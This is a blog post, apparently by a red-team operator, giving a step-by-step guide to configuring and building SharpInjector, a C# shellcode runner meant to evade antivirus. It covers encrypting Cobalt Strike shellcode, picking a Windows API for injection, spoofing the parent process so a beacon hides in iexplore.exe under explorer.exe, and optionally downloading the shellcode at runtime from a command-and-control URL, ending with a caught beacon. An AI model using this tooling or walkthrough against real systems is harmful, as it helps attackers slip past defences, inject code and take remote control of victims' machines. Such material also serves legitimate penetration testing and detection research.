---
layout: post
title: SharpInjector
subtitle: Experimenting with a shellcode runner
thumbnail-img: /assets/projects/sharpinjector/thumb.png
share-img: /assets/projects/sharpinjector/thumb.png
tags: [c#, shellcode runner, sharpinjector]
---

Since AV evasion has become more difficult over time, I've had to turn to more mature payloads and shellcode runners. Gone are the days of initial access through click-to-generate payloads like Cobalt Strike's HTA. Some of the more customized and advanced runners I've had success with are FireEye's [DueDlligence](https://github.com/fireeye/DueDLLigence), [D00mFist's](https://twitter.com/_D00mfist) [Go4aRun](https://github.com/D00MFist/Go4aRun) and [djhohnstein's](https://twitter.com/djhohnstein) [scatterbrain](https://github.com/djhohnstein/ScatterBrain). 

The SharpInjector project is my inital attempt at writing a custom shellcode runner in the same vein as those projects (lots of inspiration drawn from them, as well as this [DEFCON workshop](https://github.com/mvelazc0/defcon27_csharp_workshop) for help learning parent process ID spoofing). Below is a quick run through of setup/usage, highlighting some of the customization options along the way.

The code repository can be found [here](https://github.com/tw1sm/SharpInjector).

# Prepping the Shellcode
The final SharpInjector payload will contain encrypted shellcode, decrypt it and perform the injection. So we'll need to get some encrypted shellcode into the solution to start.

Generate your shellocde - I'll do this in Cobalt Strike: *Attacks > Packages > Windows Executable (S)*
![Generate Shellcode](/assets/projects/sharpinjector/shellcode.png){: .mx-auto.d-block :}

Clone the project and transfer your `.bin` file over the the system you're generating the payload on.
~~~
git clone https://github.com/tw1sm/SharpInjector.git
~~~

Open up the `ScEncryptor` project and edit `Program.cs`. On line 34, edit the encryption key variable:
```csharp
public static string Enc(string data)
        {
            string enc = "";
            string key = "01010101010101010101010101010101"; // CHANGE THIS TO A 16/24/32 BYTE VALUE
```

Build the `ScEncryptor` project.

Run `ScEncryptor.exe` and supply the path of your shellcode .bin as the sole argument:
![Encrypt Shellcode](/assets/projects/sharpinjector/scencryptor.png){: .mx-auto.d-block :}

Your shellcode will be encrypted, then base64 encoded and the resulting string will automatically be placed into the `SharpInjector` project in `Shellycode.cs`:
```csharp
namespace SharpInjector
{
	class EncryptedShellcode
    {
		public string EncSc = "Od/HuzTqISDnPNtgmoUZ2c8" //SNIPPED
    }
}
```

You can choose to leave the encrypted shellcode within this file and contiune customizing the project. However, if you don't want to include the shellcode string in the final binary, you can copy the base64 string out of `Shellycode.cs` and host a file with the string on the web. If the `EncSc` var is set to an empty string, your shellcode will be downloaded from a supplied URL at runtime:
```csharp
namespace SharpInjector
{
	class EncryptedShellcode
    {
		public string EncSc = "" //Has to be blank for download to run
    }
}
```

This not only has the benefit of excluding the encrypted shellcode from your binary, but it also offers you a sort of "killswitch" for the payload. If you stop hosting your shellcode file at any point, your payload will become a dud. Conversely though, your payload will now be reaching out to the internet, so consider what is best for your situation.

# Building the Payload
The shellcode is ready, let's cutomize the actual payload and build it.

Set the decryption key on line 103 within `Program.cs` in the `SharpInjector` project to match your encryption key set in the `ScEncryptor` project.
```csharp
// Decryptor func
public static string Dec(string ciphertext)
{
    string key = "01010101010101010101010101010101"; // CHANGE THIS 16/24/32 BYTE VALUE TO MATCH ENCRYPTION KEY
```

Still within `Program.cs`, on line 22 set your preferred Windows API call used to execute the shellcode. This is very similar to how `DueDlligence` offers several execution options - I've just expanded on the available options to practice importing API calls in C#.
```csharp
const ExecutionMethod exeMethod = ExecutionMethod.RtlCreateUserThread; // CHANGE THIS; shellcode exectuon method
```

On lines 24 and 25, set the parent process ID spoofing configs. Line 24 sets the parent process that a child will be spawned from. `explorer.exe` is a good target for this. On line 25, the `ProgramPath` variable specifies the child process to launch - this is the process your beacon/shell will live in.
```csharp
string ParentName = "explorer"; // CHANGE THIS: name of parent process
string ProgramPath = @"C:\Program Files\Internet Explorer\iexplore.exe"; // CHANGE THIS: path to process shellcode will be injected into
```

Lastly, if you've chosen to host your shellcode on the web for download, set the `ShellcodeUrl` variable on line 26. I'm leaving it blank (shellcode included in the binary) for this test, but an example would look like:
```csharp
string ShellcodeUrl = "https://seetwo-domain.com/shellcodefile"; // CHANGE THIS; URL of encrypted shellcode if downloading from web
```

Set your build configuration to `x64` and build the payload.

# Testing Execution
I've got the resutling `SharpInjector.exe` on my target system where I'll execute it:
![SharpInjector Execution](/assets/projects/sharpinjector/execute.png){: .mx-auto.d-block :}

And the Cobalt Strike shell caught:
![Shell](/assets/projects/sharpinjector/shell.png){: .mx-auto.d-block :}

Just to double check how this looks in ProcessExplorer, we can see the HTTPS beacon living in `iexplore.exe`, which does appear spoofed as a child of our chosen parent, `explorer.exe`.
![Shell](/assets/projects/sharpinjector/procexp.png){: .mx-auto.d-block :}